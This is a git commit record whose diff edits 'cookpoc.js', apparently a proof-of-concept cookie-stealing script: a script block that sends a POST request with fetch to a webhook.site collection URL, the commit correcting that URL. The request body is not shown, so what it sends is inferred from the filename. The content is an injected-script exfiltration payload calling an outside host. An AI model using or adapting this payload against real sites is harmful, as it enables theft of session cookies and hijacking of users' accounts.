28adbb738caa34b968cef47003840b0a83364128
CriThicK <crithick@proton.me>
2026-06-21 11:51:20 +0200

    Update cookpoc.js

--- cookpoc.js
+++ cookpoc.js
@@ -1,5 +1,5 @@
 <script>
-    var webhook = "https://webhook.site/#!/view/3ba54176-c9e2-4a19-9e45-905ec0f200d9";
+    var webhook = "https://webhook.site/3ba54176-c9e2-4a19-9e45-905ec0f200d9";
     
     fetch(webhook, {
         method: "POST",
